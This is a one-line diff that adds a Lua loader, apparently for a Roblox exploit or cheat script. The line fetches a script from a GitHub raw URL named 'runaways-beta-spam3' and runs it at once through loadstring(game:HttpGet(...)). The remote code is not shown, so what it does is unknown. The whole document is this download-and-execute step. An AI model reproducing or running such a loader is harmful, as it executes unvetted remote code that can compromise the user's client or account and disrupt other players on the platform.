@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ForestBaseDuel/loaders/main/loaders/runaways-beta-spam3-lv9n7hpmggjew2.lua"))()
